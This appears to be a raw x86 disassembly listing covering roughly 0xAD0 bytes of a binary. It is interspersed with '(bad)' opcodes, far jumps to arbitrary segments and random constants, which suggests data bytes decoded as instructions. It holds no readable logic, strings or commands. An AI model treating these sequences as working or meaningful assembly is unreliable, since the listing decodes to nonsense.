  426286:	shl    BYTE PTR [edx],cl
  426288:	or     eax,0x8ccc362c
  42628d:	lea    edi,[eax-0x6a2359f3]
  426293:	int3   
  426294:	jnp    0x4262a8
  426296:	sbb    edx,esi
  426298:	sbb    DWORD PTR [esi+eax*8+0x7cc18e9a],ecx
  42629f:	jnp    0x426319
  4262a1:	nop
  4262a2:	xchg   ebx,eax
  4262a3:	xchg   ebp,eax
  4262a4:	jnp    0x426244
  4262a6:	js     0x426291
  4262a8:	icebp  
  4262a9:	cmp    al,0xef
  4262ab:	mov    edx,0xaa0b954d
  4262b0:	pop    es
  4262b1:	or     al,0x9d
  4262b3:	mov    ebp,0x6dd04048
  4262b8:	inc    DWORD PTR [eax-0x44]
  4262bb:	mov    ah,0x26
  4262bd:	jae    0x426253
  4262bf:	es dec ecx
  4262c1:	test   DWORD PTR [ebp+0x37],edi
  4262c4:	xlat   BYTE PTR ds:[ebx]
  4262c5:	jecxz  0x426283
  4262c7:	mov    esp,0x854984e6
  4262cc:	es jmp 0x96a5c180
  4262d2:	loop   0x426262
  4262d4:	mov    WORD PTR ds:0x7a8366ac,fs
  4262da:	cli    
  4262db:	adc    al,0xb9
  4262dd:	add    eax,0xbfae6039
  4262e2:	addr16 or al,0x1f
  4262e5:	inc    ecx
  4262e7:	loop   0x42628e
  4262e9:	adc    al,0x4a
  4262eb:	mov    ch,0x10
  4262ed:	jg     0x4262fb
  4262ef:	xor    eax,0x26a21148
  4262f4:	std    
  4262f5:	xor    eax,0xc4823308
  4262fa:	push   ecx
  4262fb:	pop    esp
  4262fc:	mov    edx,0x493a40a2
  426301:	mov    dh,0x1b
  426303:	sbb    DWORD PTR [eax],edx
  426305:	mov    bl,ah
  426307:	jmp    0x426296
  426309:	les    ebx,FWORD PTR [esi+0x52dea278]
  42630f:	pop    eax
  426310:	push   ebp
  426311:	mov    dl,0x99
  426313:	fstp   DWORD PTR [esi-0x20175d80]
  426319:	mov    ch,0x45
  42631b:	std    
  42631c:	aad    0x41
  42631e:	pop    ecx
  42631f:	dec    ebp
  426320:	lods   al,BYTE PTR ds:[esi]
  426321:	dec    ecx
  426322:	adc    eax,0xefc6a029
  426327:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  426329:	push   ebx
  42632a:	rcr    BYTE PTR [ebx],1
  42632c:	test   eax,0x643f48c3
  426331:	or     al,0xef
  426333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426334:	pop    esp
  426335:	enter  0xf883,0x7a
  426339:	repz add ebx,DWORD PTR [ebp+ebx*2+0x69e514f3]
	...
  4263b1:	add    BYTE PTR [eax],al
  4263b3:	add    BYTE PTR [edx+0x9],al
  4263b6:	les    ebp,FWORD PTR [ecx-0x14901231]
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	js     0x426396
  4263c2:	mov    edi,0x19699d5
  4263c7:	add    ch,dh
  4263c9:	add    BYTE PTR [eax],al
  4263cb:	add    BYTE PTR [edx+0x6c],ch
  4263ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263cf:	cmc    
  4263d0:	rcr    BYTE PTR [ecx*4-0x65a07c0d],0xb8
  4263d8:	fcomp  QWORD PTR [eax+0x7562a65f]
  4263de:	lods   al,BYTE PTR ds:[esi]
  4263df:	(bad)  
  4263e0:	sbb    esi,DWORD PTR [ebx]
  4263e2:	mov    ah,0xd6
  4263e4:	or     dh,BYTE PTR [bp+si]
  4263e7:	and    ch,BYTE PTR [ecx-0x92aec6a]
  4263ed:	or     eax,ebp
  4263ef:	or     al,0xac
  4263f1:	rcr    bh,0xd4
  4263f4:	mov    esp,DWORD PTR cs:[edx]
  4263f7:	pop    es
  4263f8:	adc    bl,BYTE PTR [esi]
  4263fa:	(bad)  
  4263fb:	int    0x7b
  4263fd:	retf   
  4263fe:	fcmovb st,st(5)
  426400:	add    eax,0x3f0633e6
  426405:	dec    eax
  426406:	rol    BYTE PTR [eax],0x5
  426409:	test   eax,0x289b02ba
  42640e:	mov    BYTE PTR [ecx+0x3914bf32],bl
  426414:	mov    ds:0x49585ce9,al
  426419:	push   0x98668d9
  42641e:	leave  
  42641f:	cs cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  426422:	repz dec eax
  426424:	mov    eax,0x9b06753f
  426429:	xor    ch,0xf0
  42642c:	stos   BYTE PTR es:[edi],al
  42642d:	inc    ebx
  42642e:	fmul   DWORD PTR [edi]
  426430:	xchg   esi,eax
  426431:	pop    ss
  426432:	pop    edi
  426433:	into   
  426434:	call   0xad43:0x531918bb
  42643b:	out    dx,al
  42643c:	inc    ebx
  42643d:	sub    DWORD PTR [edi-0x3cae5083],esp
  426443:	sar    BYTE PTR [ebp+0x354a8d7b],cl
  426449:	(bad)  
  42644a:	iret   
  42644b:	add    DWORD PTR [edx+edi*1+0x68],edx
  42644f:	jb     0x42647e
  426451:	inc    edx
  426452:	stos   BYTE PTR es:[edi],al
  426453:	retf   
  426454:	bound  ecx,QWORD PTR [esp+ebx*2-0xc288608]
  42645b:	fiadd  DWORD PTR [ebp-0x42]
  42645e:	push   eax
  42645f:	dec    eax
  426460:	cs das 
  426462:	sub    DWORD PTR [edi+ecx*2+0x6b],0xffffff91
  426467:	sbb    ebp,DWORD PTR [ebp+0x1e]
  42646a:	in     eax,0x9c
  42646c:	gs jne 0x42648f
  42646f:	popf   
  426470:	fwait
  426471:	(bad)  
  426472:	ins    DWORD PTR es:[edi],dx
  426473:	(bad)  
  426474:	fiadd  DWORD PTR [esi-0x39a7a7fe]
  42647a:	jecxz  0x4263fe
  42647c:	enter  0xeb34,0x42
  426480:	cmp    BYTE PTR [edx-0x5ea8cea2],dh
  426486:	gs sti 
  426488:	adc    esp,DWORD PTR [eax-0x2c]
  42648b:	cmp    al,BYTE PTR [ecx-0xb]
  42648e:	push   esi
  42648f:	or     ecx,esi
  426491:	or     BYTE PTR gs:[esi+0x9d04775],al
  426498:	daa    
  426499:	call   0xce65:0x669dbe85
  4264a0:	cmp    al,0xdb
  4264a2:	popa   
  4264a3:	shr    eax,0x69
  4264a6:	push   cs
  4264a7:	mov    cl,0x91
  4264a9:	xor    al,0x51
  4264ab:	push   esi
  4264ad:	pop    ss
  4264ae:	sahf   
  4264af:	ror    esp,0x8c
  4264b2:	(bad)  
  4264b3:	push   esp
  4264b4:	lock inc ecx
  4264b6:	or     eax,0x171a19f5
  4264bb:	mov    fs:0x1870e691,al
	...
  426531:	add    BYTE PTR [eax],al
  426533:	add    ah,al
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	mov    dl,0x59
  426542:	xor    al,0x81
  426544:	mov    ss,WORD PTR [edi+0xf50001]
  42654a:	add    BYTE PTR [eax],al
  42654c:	outs   dx,BYTE PTR ds:[esi]
  42654d:	test   al,0xcb
  42654f:	shl    bl,0x3f
  426552:	sti    
  426553:	je     0x426596
  426555:	bound  ecx,QWORD PTR [ebp-0x4317419]
  42655b:	test   DWORD PTR [ebx-0x4a],edi
  42655e:	in     eax,dx
  42655f:	int    0xed
  426561:	xlat   BYTE PTR ds:[ebx]
  426562:	mov    al,ds:0x9afbb36e
  426567:	mov    al,0x78
  426569:	outs   dx,BYTE PTR ds:[esi]
  42656a:	int    0xf4
  42656c:	jne    0x426556
  42656e:	in     al,0xee
  426570:	rol    DWORD PTR [esi-0x62d059ec],0xe1
  426577:	lea    edi,[edi+0x39]
  42657a:	repz pop es
  42657c:	dec    esi
  42657d:	jle    0x4265fc
  42657f:	mov    cl,0xce
  426581:	ins    BYTE PTR es:[edi],dx
  426582:	xor    eax,0x999b87a5
  426587:	xchg   edi,eax
  426588:	out    0xb3,al
  42658a:	xor    DWORD PTR ss:[esi],edx
  42658d:	push   esp
  42658e:	fs inc ebx
  426590:	iret   
  426591:	dec    ebx
  426592:	push   esp
  426593:	adc    BYTE PTR [ebx],dl
  426595:	ins    DWORD PTR es:[edi],dx
  426596:	mov    ds,eax
  426598:	dec    eax
  426599:	lods   eax,DWORD PTR ds:[esi]
  42659a:	scas   al,BYTE PTR es:[edi]
  42659b:	dec    esp
  42659c:	pop    es
  42659d:	inc    ebx
  42659e:	mov    cl,ch
  4265a0:	retf   0xba00
  4265a3:	std    
  4265a4:	cmp    al,0xa5
  4265a6:	jp     0x426598
  4265a8:	test   eax,0xd85e222b
  4265ad:	mov    cl,0x4d
  4265af:	inc    ebx
  4265b0:	pcmpgtw mm1,QWORD PTR [ecx-0x131934f1]
  4265b7:	(bad)  
  4265ba:	sub    eax,0x8ee545d2
  4265bf:	mov    ch,BYTE PTR [ebx]
  4265c1:	pop    esi
  4265c2:	les    ebp,FWORD PTR [ecx-0x6451cd6d]
  4265c8:	ds inc esp
  4265ca:	cmp    ecx,edx
  4265cc:	xchg   edi,eax
  4265cd:	dec    esi
  4265ce:	xchg   DWORD PTR [edi+0x4a3cb8a6],esp
  4265d4:	iret   
  4265d5:	ret    0x1cfa
  4265d8:	ja     0x42661b
  4265da:	in     eax,0x2
  4265dc:	les    ecx,FWORD PTR [ebx+edi*2+0x11d03993]
  4265e3:	cmp    BYTE PTR [esi],ch
  4265e5:	cmp    DWORD PTR [ebx-0x72],eax
  4265e8:	jle    0x426662
  4265ea:	mov    DWORD PTR [ebx+0x3],0xb803faf0
  4265f1:	iret   
  4265f2:	push   ss
  4265f3:	sub    eax,0x6a5d4f54
  4265f8:	mov    bh,0xa0
  4265fa:	push   ebx
  4265fb:	call   0xa43d689
  426600:	rcr    BYTE PTR [ebx+0x1b],cl
  426603:	fisttp QWORD PTR [ebx-0x29]
  426606:	imul   ebp,DWORD PTR [ebx+0x206cbe2a],0x9d8c0ebf
  426610:	(bad)  
  426611:	pop    edx
  426612:	ror    edi,cl
  426614:	repnz xchg ebx,eax
  426616:	xor    bl,al
  426618:	pop    es
  426619:	sub    eax,0x338583c0
  42661e:	pop    ds
  42661f:	pop    ebp
  426620:	add    eax,0x9857f713
  426625:	(bad)  
  426626:	sub    DWORD PTR fs:[edx+0x4f],edi
  42662a:	cmp    al,0x3c
  42662c:	jl     0x4265bd
  42662e:	mov    esp,ecx
  426630:	js     0x426627
  426632:	mov    ecx,0xe9a04716
  426637:	add    eax,ebx
  426639:	inc    eax
  42663a:	enter  0xea3b,0xea
  42663e:	or     bl,BYTE PTR [edi+0x3f]
	...
  4266b1:	add    BYTE PTR [eax],al
  4266b3:	add    dh,dl
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	(bad)  
  4266c1:	mov    eax,ds:0x988316ac
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	cmc    
  4266c9:	add    BYTE PTR [eax],al
  4266cb:	add    BYTE PTR [eax-0xbde6d89],ch
  4266d1:	mov    al,ds:0xadff77d3
  4266d6:	add    edi,esi
  4266d8:	loope  0x426722
  4266da:	cmp    BYTE PTR [ebp+0x75025a6d],dh
  4266e0:	mov    dh,0x9d
  4266e2:	pop    esp
  4266e3:	int3   
  4266e4:	jg     0x4266d4
  4266e6:	outs   dx,DWORD PTR ds:[esi]
  4266e7:	dec    ebx
  4266e8:	add    esp,ecx
  4266ea:	loop   0x42666e
  4266ec:	jmp    0x426724
  4266ee:	mov    al,0xba
  4266f0:	mov    BYTE PTR [edi-0x6b5f0b4f],al
  4266f6:	sbb    BYTE PTR [ebx-0x3f],ah
  4266f9:	ins    DWORD PTR es:[edi],dx
  4266fa:	jnp    0x4266bb
  4266fc:	sub    dl,BYTE PTR [esi]
  4266fe:	and    DWORD PTR [edx],ebp
  426700:	je     0x4266bd
  426702:	(bad)  
  426704:	fistp  DWORD PTR [edx]
  426706:	and    esp,DWORD PTR [edx+ecx*2-0x7c1c72fe]
  42670d:	add    al,0xd7
  42670f:	jnp    0x426756
  426711:	jl     0x4266f8
  426713:	std    
  426714:	cs adc eax,0x3425562c
  42671a:	aas    
  42671b:	loope  0x426777
  42671d:	xor    BYTE PTR [edi+0x6],bh
  426720:	call   0x7083:0x70f7d95e
  426727:	out    dx,eax
  426728:	loop   0x426777
  42672a:	jl     0x4266d9
  42672c:	repz imul eax,DWORD PTR [eax],0xfffffff4
  426730:	pop    edi
  426731:	clc    
  426732:	cli    
  426733:	xchg   edx,eax
  426734:	idiv   DWORD PTR [eax]
  426736:	or     dh,dh
  426738:	add    dh,BYTE PTR [ebp-0xd]
  42673b:	fisttp DWORD PTR [edi-0x3b]
  42673e:	mov    dh,0x2
  426740:	mov    edx,0xe3c64230
  426745:	cmc    
  426746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426747:	mov    al,ds:0x8390619f
  42674c:	cld    
  42674d:	ins    BYTE PTR es:[edi],dx
  42674e:	xor    eax,edi
  426750:	clc    
  426751:	clc    
  426752:	mov    bh,0x47
  426754:	add    edi,ecx
  426756:	jg     0x4266e6
  426758:	sbb    al,0xea
  42675a:	inc    esp
  42675b:	or     eax,DWORD PTR [esi]
  42675d:	stos   BYTE PTR es:[edi],al
  42675e:	push   ss
  42675f:	mov    esp,0x591e42ab
  426764:	pop    ebp
  426765:	adc    bl,BYTE PTR [ecx+0x38bdda89]
  42676b:	jl     0x42671a
  42676d:	xchg   edx,eax
  42676e:	jb     0x4266f1
  426770:	das    
  426771:	push   esp
  426772:	mov    edi,eax
  426774:	xor    al,0x5a
  426776:	mov    dl,ch
  426778:	out    0x2c,al
  42677a:	hlt    
  42677b:	xchg   ebx,eax
  42677c:	punpcklwd mm2,DWORD PTR [eax-0x6915ff6b]
  426783:	jne    0x426733
  426785:	xchg   ebp,eax
  426786:	mov    eax,0x48859512
  42678b:	push   ss
  42678c:	pusha  
  42678d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42678e:	sbb    al,0x2
  426790:	add    BYTE PTR [ecx],ah
  426792:	fisttp QWORD PTR ss:[ecx]
  426795:	pop    eax
  426796:	lods   eax,DWORD PTR ds:[esi]
  426797:	adc    BYTE PTR [edi+0x4fc2ab4a],dh
  42679d:	mov    edx,DWORD PTR [esi+ebp*2-0x10]
  4267a1:	icebp  
  4267a2:	loopne 0x42672b
  4267a4:	(bad)  
  4267a5:	leave  
  4267a6:	je     0x426793
  4267a8:	int3   
  4267a9:	in     al,0xe9
  4267ab:	mov    edi,0x420e9f7
  4267b0:	lock or bl,ch
  4267b3:	and    ebx,DWORD PTR [esi-0x6f316a34]
  4267b9:	mov    ah,0x82
  4267bb:	les    eax,FWORD PTR [esi-0x7e]
  4267be:	sbb    ebp,DWORD PTR [edx]
  4267c0:	mov    esi,0x0
	...
  426831:	add    BYTE PTR [eax],al
  426833:	add    BYTE PTR [edx+edx*2-0x70],bl
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x3bfe6a34],cl
  426843:	mov    ds:0x19978,eax
  426848:	cmc    
  426849:	add    BYTE PTR [eax],al
  42684b:	add    bh,dh
  42684d:	xor    BYTE PTR [eax],0x20
  426850:	sbb    eax,0x9a20de32
  426855:	fs popa 
  426857:	dec    eax
  426858:	push   ebx
  426859:	or     bl,ch
  42685b:	cli    
  42685c:	or     DWORD PTR [ebp+0x5fc73988],0x15aff9a5
  426866:	add    al,0x9
  426868:	pop    eax
  426869:	push   ecx
  42686a:	sub    DWORD PTR [edx+eiz*4],0x41
  42686e:	cmp    ebx,DWORD PTR [ecx+ecx*8+0x3b]
  426872:	cmp    BYTE PTR [ecx],dl
  426874:	enter  0x1833,0x27
  426878:	sbb    al,0xe3
  42687a:	imul   esi,ecx,0x20cbe280
  426880:	inc    ebp
  426881:	retf   0x4175
  426884:	addr16 gs push edx
  426887:	call   ebp
  426889:	xchg   DWORD PTR [esi+0x4c],edx
  42688c:	or     DWORD PTR [ecx+edi*1-0x1d59f82e],ecx
  426893:	push   0x17238cbc
  426898:	jmp    0x426854
  42689a:	std    
  42689b:	ds mov dh,0x3b
  42689e:	fld    DWORD PTR [edi]
  4268a0:	xchg   ebx,eax
  4268a1:	or     eax,0xbe193e0
  4268a6:	in     eax,dx
  4268a7:	dec    esi
  4268a8:	cli    
  4268a9:	xchg   ebx,eax
  4268aa:	fcomp  QWORD PTR [ecx+0x67fd0ef1]
  4268b0:	jecxz  0x4268a5
  4268b2:	mov    dl,0x50
  4268b4:	cmp    BYTE PTR [esi-0x5893ff8],dh
  4268ba:	mov    dl,0xf6
  4268bc:	retf   0xc21c
  4268bf:	in     al,dx
  4268c0:	sbb    ch,al
  4268c2:	mov    DWORD PTR [esi],edx
  4268c4:	push   eax
  4268c5:	repnz bound esi,QWORD PTR [edx]
  4268c8:	push   0xffffffc2
  4268ca:	adc    eax,0x293aed48
  4268cf:	mov    bl,0xa7
  4268d1:	jge    0x4268fb
  4268d3:	lods   al,BYTE PTR ds:[esi]
  4268d4:	xor    BYTE PTR [esi-0x1ec3aa1c],dl
  4268da:	test   al,0x89
  4268dc:	adc    BYTE PTR [edx+0x68],0x6
  4268e0:	cwde   
  4268e1:	inc    edi
  4268e2:	hlt    
  4268e3:	xchg   BYTE PTR [ebx+0x6f560c0c],ah
  4268e9:	or     al,0xbc
  4268eb:	call   0xc8ea:0x6ea94cce
  4268f2:	nop
  4268f3:	fiadd  DWORD PTR [esi+0x20637738]
  4268f9:	dec    eax
  4268fa:	daa    
  4268fb:	inc    ecx
  4268fc:	fdivr  st,st(1)
  4268fe:	ficomp DWORD PTR [ecx-0x6c8bed1f]
  426904:	xor    ch,BYTE PTR [eax]
  426906:	fisttp DWORD PTR [ebp+0x3afa3f22]
  42690c:	mov    eax,ds:0xe2fe2d70
  426911:	int    0x5a
  426913:	iret   
  426914:	add    edx,ebp
  426916:	sub    BYTE PTR [edi-0x3],ah
  426919:	in     al,0xb
  42691b:	lods   eax,DWORD PTR ds:[esi]
  42691c:	inc    ebp
  42691d:	call   FWORD PTR [eax+0x5cf592d3]
  426923:	imul   esp,DWORD PTR [edx+ecx*1-0x74],0xffffffd7
  426928:	pop    eax
  426929:	and    al,0x28
  42692b:	mov    BYTE PTR [eax-0x63f47e],dh
  426931:	aad    0x6e
  426933:	cwde   
  426934:	jne    0x426938
  426936:	test   eax,0x9030a12
  42693b:	int3   
  42693c:	sub    BYTE PTR [edi],dh
  42693e:	sbb    dh,bh
  426940:	and    eax,0x0
	...
  4269b1:	add    BYTE PTR [eax],al
  4269b3:	add    cl,al
  4269b5:	arpl   WORD PTR [edi+eiz*2],ax
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	jmp    0x19a:0x6d14f148
  4269c7:	add    ch,dh
  4269c9:	add    BYTE PTR [eax],al
  4269cb:	add    BYTE PTR [eax],cl
  4269cd:	adc    al,0xec
  4269cf:	in     al,0x74
  4269d1:	bound  esi,QWORD PTR [esi+0x456e33aa]
  4269d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269d8:	mov    ecx,0x5ed85328
  4269dd:	fmul   QWORD PTR [edi+eiz*4+0x66dba9f6]
  4269e4:	aad    0xee
  4269e6:	lea    ebp,[edi+0x60]
  4269e9:	xchg   esp,eax
  4269ea:	fcmovnb st,st(4)
  4269ec:	shr    DWORD PTR [esi+0x3370d62f],cl
  4269f2:	cmc    
  4269f3:	sbb    BYTE PTR cs:[ebx],ch
  4269f6:	mov    cl,0xf3
  4269f8:	jnp    0x426a75
  4269fa:	xor    eax,0xe75fedd1
  4269ff:	xchg   esp,eax
  426a00:	add    DWORD PTR [eax-0x35],edi
  426a03:	(bad)  
  426a04:	push   0xffffffd7
  426a06:	inc    eax
  426a07:	rol    DWORD PTR [esi],1
  426a09:	mov    al,ds:0x46a8e375
  426a0e:	add    ebx,DWORD PTR [edx+ebx*2-0x7c85fb89]
  426a15:	sbb    DWORD PTR ds:[edi],ebp
  426a18:	cwde   
  426a19:	ins    DWORD PTR es:[edi],dx
  426a1a:	dec    ecx
  426a1b:	mov    esp,0xd412144e
  426a20:	or     edx,DWORD PTR [esi]
  426a22:	cmp    BYTE PTR [esi-0x529d865d],bh
  426a28:	push   edi
  426a29:	lods   al,BYTE PTR ds:[esi]
  426a2a:	out    dx,al
  426a2b:	je     0x426a3e
  426a2d:	push   ecx
  426a2e:	test   al,0x71
  426a30:	(bad)  
  426a31:	ds jge 0x426a83
  426a34:	add    eax,0x921be4eb
  426a39:	call   0x3057e2fb
  426a3e:	push   esp
  426a3f:	sar    BYTE PTR [edx-0x78],0x64
  426a43:	(bad)  
  426a44:	cmp    al,dl
  426a46:	pop    eax
  426a47:	jb     0x426ab2
  426a49:	aas    
  426a4a:	shl    DWORD PTR [eax-0x584fb980],0x31
  426a51:	leave  
  426a52:	das    
  426a53:	xor    eax,0xb721485d
  426a58:	jecxz  0x4269df
  426a5a:	scas   eax,DWORD PTR es:[edi]
  426a5b:	repnz loope 0x426ab6
  426a5e:	(bad)  
  426a5f:	mov    al,0xcd
  426a61:	inc    esp
  426a62:	(bad)  
  426a63:	cli    
  426a64:	aas    
  426a65:	adc    eax,0xb834a0e1
  426a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a6b:	or     BYTE PTR [ebx],dl
  426a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a6e:	retf   0x3bb
  426a71:	adc    ebx,DWORD PTR [ecx]
  426a73:	xchg   ecx,eax
  426a74:	pop    edi
  426a75:	dec    ebp
  426a76:	jmp    0x426a62
  426a78:	(bad)  
  426a79:	push   ebp
  426a7a:	pop    eax
  426a7b:	loope  0x426a8c
  426a7d:	pop    edx
  426a7e:	call   0x4318:0x25202de4
  426a85:	cmc    
  426a86:	xor    ah,BYTE PTR [esi-0x29]
  426a89:	lods   al,BYTE PTR ds:[esi]
  426a8a:	mov    esp,0x9097f797
  426a8f:	out    dx,eax
  426a90:	dec    edi
  426a91:	bsf    edi,DWORD PTR [edi]
  426a94:	push   ecx
  426a95:	jmp    0x61d0feae
  426a9a:	mov    eax,0xb89048fc
  426a9f:	mov    esp,0x7c0e8773
  426aa4:	pushf  
  426aa5:	lock xlat BYTE PTR ds:[ebx]
  426aa7:	jge    0x426a58
  426aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426aaa:	push   ds
  426aab:	jmp    0x9e8a:0xce7e3ae4
  426ab2:	xlat   BYTE PTR ds:[ebx]
  426ab3:	jno    0x426a55
  426ab5:	fistp  QWORD PTR [eax+0x5a]
  426ab8:	icebp  
  426ab9:	pop    ecx
  426aba:	fs jl  0x426afa
  426abd:	dec    edx
  426abe:	cmc    
  426abf:	sbb    eax,0xcf
	...
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	jo     0x426b8a
  426b42:	out    0xf9,al
  426b44:	bound  ebx,QWORD PTR [ebx+0xf50001]
  426b4a:	add    BYTE PTR [eax],al
  426b4c:	add    bl,BYTE PTR [eax+0x3be2ca45]
  426b52:	push   esi
  426b53:	js     0x426b69
  426b55:	hlt    
  426b56:	sbb    eax,0x939c653e
  426b5b:	icebp  
  426b5c:	inc    edi
  426b5d:	add    ch,BYTE PTR [eax]
  426b5f:	out    0xe1,al
  426b61:	ret    
  426b62:	ds xchg edx,eax
  426b64:	and    esi,DWORD PTR [eax-0x72c0e5e2]
  426b6a:	into   
  426b6b:	xchg   BYTE PTR [ecx+0x49a4d1c3],dh
  426b71:	test   DWORD PTR [edi+0x6f],esp
  426b74:	lahf   
  426b75:	inc    ebp
  426b76:	leave  
  426b77:	fild   DWORD PTR [ebx]
  426b79:	mov    ebp,0x5e52c59a
  426b7e:	sar    ah,1
  426b80:	das    
  426b81:	sbb    ah,cl
  426b83:	call   0x65f1:0xfab99954
  426b8a:	pop    esp
  426b8b:	aam    0x74
  426b8d:	int    0xa2
  426b8f:	loopne 0x426ba2
  426b91:	cwde   
  426b92:	mov    edi,0x8188b824
  426b97:	(bad)
  426b9c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  426b9e:	lahf   
  426b9f:	frstor [edx-0xbb2cc4]
  426ba5:	test   eax,0x2ad9a62b
  426baa:	dec    ebp
  426bab:	jmp    0x426c10
  426bad:	and    ah,BYTE PTR [ecx]
  426baf:	pop    esi
  426bb0:	xchg   edi,eax
  426bb1:	call   0xd32a:0x391e3eeb
  426bb8:	(bad)  
  426bb9:	popf   
  426bba:	sbb    eax,0xe7ee88a7
  426bbf:	jnp    0x426b98
  426bc1:	cmp    al,ch
  426bc3:	push   edx
  426bc4:	shl    BYTE PTR [edx+0x4c],cl
  426bc7:	fldenv [ebp+0x643aab63]
  426bcd:	adc    dh,bl
  426bcf:	dec    ecx
  426bd0:	out    0xcf,eax
  426bd2:	std    
  426bd3:	and    edi,DWORD PTR [esi+0x7d35f3e4]
  426bd9:	inc    edx
  426bda:	push   eax
  426bdb:	add    eax,0x478c0374
  426be0:	add    al,0xf9
  426be2:	rcl    DWORD PTR [esi-0x3f8f2b9f],0x1c
  426be9:	fwait
  426bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426beb:	xor    al,0x99
  426bed:	sbb    ebx,ebp
  426bef:	leave  
  426bf0:	daa    
  426bf1:	out    0x57,al
  426bf3:	and    BYTE PTR [eax-0x7c],dh
  426bf6:	jno    0x426c01
  426bf8:	aad    0xa4
  426bfa:	lahf   
  426bfb:	les    esi,FWORD PTR [edi]
  426bfd:	add    ebx,ebp
  426bff:	xor    BYTE PTR [ebx],ch
  426c01:	push   ds
  426c02:	in     eax,0x56
  426c04:	sub    eax,0xfb34526
  426c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c0a:	jmp    DWORD PTR [ebp-0xce13eec]
  426c10:	fld    TBYTE PTR [ebx+0x1b]
  426c13:	or     al,0xb4
  426c15:	pusha  
  426c16:	fs cmp ebp,edx
  426c19:	push   0x68
  426c1b:	mov    eax,ds:0x98e1c6d7
  426c20:	xchg   esp,eax
  426c21:	cld    
  426c22:	ret    
  426c23:	sbb    BYTE PTR [edx*1-0x5f6100d],dl
  426c2a:	mov    dl,bl
  426c2c:	rcl    DWORD PTR [eax+0x74ccf3f4],0x9e
  426c33:	je     0x426bf9
  426c35:	das    
  426c36:	or     DWORD PTR [ebp-0x28],0x8253087f
  426c3d:	and    BYTE PTR [ecx],cl
  426c3f:	(bad)  
  426c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  426cb1:	add    BYTE PTR [eax],al
  426cb3:	add    bh,bh
  426cb5:	lods   al,BYTE PTR ds:[esi]
  426cb6:	fadd   QWORD PTR [edi]
  426cb8:	fbstp  TBYTE PTR [edi-0x1]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	inc    esi
  426cc1:	retf   
  426cc2:	xchg   ecx,eax
  426cc3:	cmp    DWORD PTR [edi-0x64],edx
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	cmc    
  426cc9:	add    BYTE PTR [eax],al
  426ccb:	add    dl,ah
  426ccd:	jecxz  0x426cec
  426ccf:	sub    al,BYTE PTR [edx]
  426cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cd2:	icebp  
  426cd3:	sub    bh,BYTE PTR [ecx+eax*8]
  426cd6:	stos   BYTE PTR es:[edi],al
  426cd7:	mov    bl,0x38
  426cd9:	fnstsw WORD PTR [edx-0x1a]
  426cdc:	ret    0x25b1
  426cdf:	sub    esi,ebx
  426ce1:	icebp  
  426ce2:	jmp    0xa2b54910
  426ce7:	in     eax,dx
  426ce8:	lock dec esp
  426cea:	or     bl,al
  426cec:	fnstcw WORD PTR [ebp-0x3]
  426cef:	mov    edx,0xa5f63ea4
  426cf4:	sahf   
  426cf5:	lahf   
  426cf6:	jecxz  0x426ccb
  426cf8:	inc    eax
  426cf9:	and    eax,0x24b9139f
  426cfe:	jp     0x426cbe
  426d00:	fisub  DWORD PTR [esi+0x6b]
  426d03:	xor    BYTE PTR [ebx+0x2e231d6],bl
  426d09:	aas    
  426d0a:	mov    ah,0xc1
  426d0c:	cld    
  426d0d:	jmp    0x9b87:0x2b07cc75
  426d14:	xchg   ebx,eax
  426d15:	mov    DWORD PTR [eax-0x6],edx
  426d18:	sub    dh,al
  426d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d1b:	repnz fucomip st,st(1)
  426d1e:	mov    edi,0x6248ee6a
  426d23:	out    0x68,al
  426d25:	ret    0xb5a7
  426d28:	and    BYTE PTR [esi+ecx*1-0x6badc307],ch
  426d2f:	push   0x1d
  426d31:	lock cdq 
  426d33:	sbb    ch,cl
  426d35:	scas   eax,DWORD PTR es:[edi]
  426d36:	mov    WORD PTR [edx],gs
  426d38:	jne    0x426d68
  426d3a:	sbb    DWORD PTR [ebp-0x76e13d28],0x36
  426d41:	xchg   DWORD PTR [ebp+0x7f],esi
  426d44:	stos   DWORD PTR es:[edi],eax
  426d45:	add    bl,dh
  426d47:	aad    0xb2
  426d49:	cmp    eax,0x27b1763
  426d4e:	call   0x7c3b:0x6b834609
  426d55:	lea    ebx,[esp+ebp*1]
  426d58:	sbb    eax,0x80b67fc0
  426d5d:	repz iretw 
  426d60:	push   esp
  426d61:	mov    al,0xba
